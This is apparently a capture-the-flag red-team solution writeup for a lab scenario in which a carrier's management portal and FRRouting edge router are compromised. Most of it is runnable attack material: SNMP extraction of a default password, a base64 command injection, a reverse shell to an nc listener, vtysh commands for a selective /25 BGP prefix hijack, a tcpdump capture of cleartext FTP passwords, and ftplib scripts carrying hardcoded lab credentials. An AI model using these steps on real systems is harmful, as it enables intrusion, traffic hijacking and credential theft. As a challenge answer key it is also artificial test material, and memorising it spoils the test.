e# solve_red.md - NWR-CARRIER-01 - DakshinLink Route Interception
## Red Team Solution Writeup

**Component:** DakshinLink management portal and FRRouting carrier edge
**Attack chain:** SNMP information disclosure -> default credential recovery -> authenticated command injection -> router shell -> selective BGP prefix hijack -> FTP credential interception  
**MITRE ATT&CK:** T1046, T1018, T1190, T1059, T1016, T1557  
**Severity:** Critical

---

## 1. Overview - What, Why and How

DakshinLink Networks operates a network-management portal and an edge router named **R1**. R1 exchanges BGP routes with two other service-provider networks:

- **Vindhya Broadband**, whose network contains a recurring VIP FTP client.
- **Sahyadri Data Exchange**, whose network contains a protected FTP archive.

Under normal conditions, the Vindhya client reaches the Sahyadri FTP server through the direct connection between their two routers. That traffic does **not** pass through DakshinLink R1.

Your initial objective is to compromise DakshinLink's management chain. The public portal exposes a device serial number through weak SNMP configuration. The same serial number is still used as the portal's default administrator password. After login, a diagnostic feature contains command injection.

The diagnostic feature is important because it does not execute the command inside the web container. The portal first connects to **R1 over SSH**, then executes the diagnostic command on R1. When the injected command starts a reverse shell, the reverse shell therefore comes from **the R1 router container**.

Once on R1, your objective changes. You are no longer attacking the web application. You are controlling a real BGP-speaking router positioned beside the normal FTP route. You use BGP to convince Vindhya's router that R1 has a more specific path to the Sahyadri FTP subnet. Vindhya then sends its FTP requests through R1.

R1 still knows the legitimate route onward to Sahyadri, so it forwards the packets instead of dropping them. While the traffic passes through R1, you capture the clear-text FTP control connection and observe its `USER` and `PASS` commands.

In one sentence:

> Compromise the management portal, land on DakshinLink R1, selectively place R1 in the path of a real FTP session, and recover the password from live network traffic without stopping the service.

These 3 service-providers operate their own independent **Autonomous System (AS)**:

| Organisation | Scenario role | Autonomous system role |
|---|---|---|
| DakshinLink Networks | The assessed carrier whose R1 router is compromised | AS1, with a runtime-generated ASN |
| Vindhya Broadband | The provider containing the recurring VIP FTP client | AS2, with a runtime-generated ASN |
| Sahyadri Data Exchange | The provider containing the protected FTP archive | AS3, with a runtime-generated ASN |

An AS is not a single router. It is a network or group of IP prefixes operated under one routing policy. For this compact scenario, one FRRouting router represents the edge of each AS.

The actual AS numbers are generated during deployment. The labels **AS1**, **AS2**, and **AS3** describe their roles; they are not fixed numeric ASNs.
<img width="1447" height="321" alt="image" src="https://github.com/user-attachments/assets/5daf8bf9-3be9-4443-8c26-dd62cfeaad5c" />
<img width="987" height="673" alt="image" src="https://github.com/user-attachments/assets/45bcee93-43dd-47a8-9f26-fd231a3a1dc5" />

---

## 2. Prerequisites

- Kali Linux with `nmap`, `snmpwalk`, `curl`, Burp Suite, `nc`, `tcpdump` and Python 3
- Reachability to the assigned challenge VM
- Permission to receive a reverse-shell callback from the challenge VM
- The supplied `Red-Team-Attack-Script.sh` may be used after manual reconnaissance

Set only the platform-supplied address:

```bash
export TARGET_IP="<assigned-challenge-vm-ip>"
```

## 3. Phase 1 - Black-box reconnaissance

### 3.1 Discover TCP services

```bash
nmap -Pn -sS -p- --min-rate 1500 "$TARGET_IP"
```

Identify the HTTP management port from its page title and response:

```bash
export HTTP_PORT="<discovered-http-port>"
curl -i "http://${TARGET_IP}:${HTTP_PORT}/"
```

The login page displays error codes `45009` and `45010`. Do not guess the
password yet.

### 3.2 Discover the UDP monitoring service

Use a complete UDP scan or narrow candidates identified by the platform's
network scan:

```bash
sudo nmap -Pn -sU --open -p- --min-rate 1000 "$TARGET_IP"
export SNMP_PORT="<discovered-snmp-port>"
sudo nmap -Pn -sU -sV -p "$SNMP_PORT" "$TARGET_IP"

To get the banner of running SNMP
sudo nmap -sU -p 18161 -sV --script=banner "$TARGET_IP"
```

### 3.3 Enumerate web content

```bash
feroxbuster -u "http://${TARGET_IP}:${HTTP_PORT}/" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Review:

- `/doc/`
- `/debug/`
- `/tools/remote.php`

Download the error-code manual and topology:

```bash
curl -o error_codes.pdf "http://${TARGET_IP}:${HTTP_PORT}/doc/error_codes.pdf"
curl -o diagram_for_tac.png "http://${TARGET_IP}:${HTTP_PORT}/doc/diagram_for_tac.png"
```

Error `45009` explains that the default administrator password is the
device chassis serial. The topology image identifies the three live ASNs
and maps them to DakshinLink, Vindhya Broadband and Sahyadri Data Exchange.

## 4. Phase 2 - SNMP serial disclosure and portal access

Query the real SNMP agent using the intentionally weak default community:

```bash
snmpwalk -v1 -c public -t 3 -r 1 \
  "udp:${TARGET_IP}:${SNMP_PORT}" \
  .1.3.6.1.2.1.47.1.1.1.1.11
```

Extract the live serial:

```bash
export SERIAL="$(
  snmpwalk -v1 -c public -t 3 -r 1 \
    "udp:${TARGET_IP}:${SNMP_PORT}" \
    .1.3.6.1.2.1.47.1.1.1.1.11 \
  | sed -n 's/.*SN#\([^"]*\).*/\1/p' | head -n1
)"
printf 'SERIAL=%s\n' "$SERIAL"
```

Log in through a browser with:

```text
Username: admin
Password: <live serial returned by SNMP>
```

For a command-line session:

```bash
export COOKIE="$(mktemp)"
curl -sS -L -c "$COOKIE" -b "$COOKIE" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=$SERIAL" \
  "http://${TARGET_IP}:${HTTP_PORT}/index.php" \
  -o dashboard.html
grep -F "DakshinLink routing operations" dashboard.html
```

## 5. Phase 3 - Diagnostics command injection

Open Diagnostics through Burp Suite and intercept the `POST /diag.php`
request. The hidden `check` value is base64 and decodes to `frr`:

```bash
printf '%s' '<captured-check-value>' | base64 -d
```

The application builds a remote command in the form:

```text
ps aux | grep <decoded-check>
```

Terminate the expected command and append `id`:

```bash
export INJECTION_B64="$(printf '%s' ';id;hostname' | base64 -w0)"
curl -sS -b "$COOKIE" \
  --data-urlencode "check=$INJECTION_B64" \
  "http://${TARGET_IP}:${HTTP_PORT}/diag.php"
```

The returned output proves command execution as `uid=0(root)` on the
DakshinLink router, not inside the web portal.

The supplied script performs the same live SNMP, login and diagnostic
request:

```bash
./Red-Team-Attack-Script.sh "$TARGET_IP" "$HTTP_PORT" "$SNMP_PORT" probe
```

## 6. Phase 4 - Obtain an interactive router shell

Derive the Kali address actually selected for the target:

```bash
export LHOST="$(
  ip -4 route get "$TARGET_IP" |
  awk '{for(i=1;i<=NF;i++)if($i=="src"){print $(i+1);exit}}'
)"
export LPORT="$(
  python3 - <<'PY'
import socket
s = socket.socket()
s.bind(("", 0))
print(s.getsockname()[1])
s.close()
PY
)"
printf 'LHOST=%s LPORT=%s\n' "$LHOST" "$LPORT"
```

Start the listener first:

```bash
nc -lvnp "$LPORT"
```

In another terminal:

```bash
./Red-Team-Attack-Script.sh \
  "$TARGET_IP" "$HTTP_PORT" "$SNMP_PORT" \
  reverse "$LHOST" "$LPORT"
```

Confirm the shell:

```bash
id
hostname
ip -br address
```

## 7. Phase 5 - Understand the live BGP topology

The support ticket identifies a protected FTP **subnet**, but not a
password. Record the subnet exactly:

```bash
export FTP_SUBNET="<subnet-from-ticket-6>"
```

On the router shell:

```bash
vtysh -c "show running-config"
vtysh -c "show bgp ipv4 unicast summary"
vtysh -c "show bgp ipv4 unicast"
ip -4 route
```

Map each neighbor ASN to the organisation shown in
`diagram_for_tac.png`. Record:

```bash
export LOCAL_AS="<DakshinLink-AS-from-live-output>"
export CLIENT_PEER="<Vindhya-neighbor-IP>"
export SERVER_PEER="<Sahyadri-neighbor-IP>"
```

Before exploitation, DakshinLink learns the FTP `/24` from the server AS,
while the client AS also has a shorter direct path to that server AS.

## 8. Phase 6 - Build the selective more-specific hijack

Split the discovered FTP `/24` into two `/25` networks:

```bash
read -r PREFIX_A PREFIX_B < <(
  python3 - "$FTP_SUBNET" <<'PY'
import ipaddress, sys
halves = list(ipaddress.ip_network(sys.argv[1], strict=False).subnets(prefixlen_diff=1))
print(halves[0], halves[1])
PY
)
printf 'PREFIX_A=%s\nPREFIX_B=%s\n' "$PREFIX_A" "$PREFIX_B"
```

Apply the route policy from the router shell:

```bash
vtysh \
  -c "configure terminal" \
  -c "ip prefix-list HIJACK seq 5 permit $PREFIX_A" \
  -c "ip prefix-list HIJACK seq 10 permit $PREFIX_B" \
  -c "route-map TO-AS2 permit 10" \
  -c "match ip address prefix-list HIJACK" \
  -c "set community no-export" \
  -c "route-map TO-AS2 permit 20" \
  -c "route-map TO-AS3 deny 10" \
  -c "match ip address prefix-list HIJACK" \
  -c "route-map TO-AS3 permit 20" \
  -c "router bgp $LOCAL_AS" \
  -c "network $PREFIX_A" \
  -c "network $PREFIX_B" \
  -c "end" \
  -c "clear bgp $CLIENT_PEER soft out"
```

Why both controls matter:

- `no-export` tells the client AS not to re-advertise the more-specifics.
- `TO-AS3 deny 10` prevents DakshinLink from sending the hijack routes to
  the server AS.

Without those controls, the server AS can install the more-specific route
back toward the attacker and create a loop or black hole.

Confirm the live advertisement:

```bash
vtysh -c "show bgp ipv4 unicast neighbors $CLIENT_PEER advertised-routes"
vtysh -c "show bgp ipv4 unicast neighbors $SERVER_PEER advertised-routes"
```

The two `/25` routes must be visible toward the client peer and absent
toward the server peer.

## 9. Phase 7 - Intercept the real FTP authentication

The recurring client now sends traffic through the compromised router.
Capture only real FTP control traffic for the discovered network:

```bash
tcpdump -ni any -A "dst net $FTP_SUBNET and tcp dst port 21"
```

Wait for the next scheduled transfer. Record the clear-text lines:

```text
USER <live-user>
PASS <live-password>
```

These values were generated during deployment and came from actual packets.
Submit the exact raw value following `PASS`. Do not add a wrapper.

Identify the FTP server address from the same packet capture, then confirm
that the intercepted account is also valid for the protected host:

```bash
export FTP_SERVER_IP="<server-address-from-live-packets>"
export FTP_USER="<value-after-USER>"
ssh "${FTP_USER}@${FTP_SERVER_IP}"
cat archive/network-operations-archive.txt

OR

List the FTP files:

python3 - <<'PY'
from ftplib import FTP

host = "10.117.117.10"
username = "ops_913a98"
password = "afe5c5021b3378377563"

with FTP() as ftp:
    ftp.connect(host, 21, timeout=10)
    ftp.login(username, password)
    ftp.set_pasv(True)

    print("[+] Authentication successful")
    print("[+] Available files:")
    ftp.retrlines("LIST")
PY

After finding the filename, download it using:
python3 - "$FILE_NAME" <<'PY'
from ftplib import FTP
from pathlib import Path
import sys

host = "10.117.117.10"
username = "ops_913a98"
password = "afe5c5021b3378377563"
remote_name = sys.argv[1]
local_name = Path(remote_name).name

with FTP() as ftp:
    ftp.connect(host, 21, timeout=10)
    ftp.login(username, password)
    ftp.set_pasv(True)

    with open(local_name, "wb") as output:
        ftp.retrbinary(f"RETR {remote_name}", output.write)

print(f"[+] Downloaded: {local_name}")
PY
```

This final access is performed from the compromised R1 router because the
protected host is part of the hidden carrier topology.

## 10. Evidence checklist

- TCP and UDP reconnaissance
- SNMP serial response
- Successful portal login
- Command-injection response showing root execution
- Router shell and live BGP summary
- Dynamically discovered three-AS mapping and FTP subnet
- Two `/25` advertisements toward the client AS only
- Packet capture showing real FTP `USER` and `PASS`

## 11. Cleanup

Remove only the routes and policy sequences added during exploitation:

```bash
vtysh \
  -c "configure terminal" \
  -c "router bgp $LOCAL_AS" \
  -c "no network $PREFIX_A" \
  -c "no network $PREFIX_B" \
  -c "exit" \
  -c "no route-map TO-AS2 permit 10" \
  -c "no route-map TO-AS3 deny 10" \
  -c "no ip prefix-list HIJACK" \
  -c "end" \
  -c "clear bgp $CLIENT_PEER soft out"
```

Close the reverse shell and confirm that legitimate BGP sessions and the
FTP workflow remain operational.

## 12. Common mistakes

1. Hardcoding a callback address instead of deriving the Kali source IP.
2. Treating the topology diagram's values as static across deployments.
3. Advertising the `/25` routes to the server AS.
4. Omitting `no-export`, allowing the client AS to leak the routes.
5. Blackholing the prefixes locally instead of preserving transit forwarding.
6. Capturing on Kali rather than on the compromised transit router.
7. Submitting a package value instead of the `PASS` observed in live traffic.

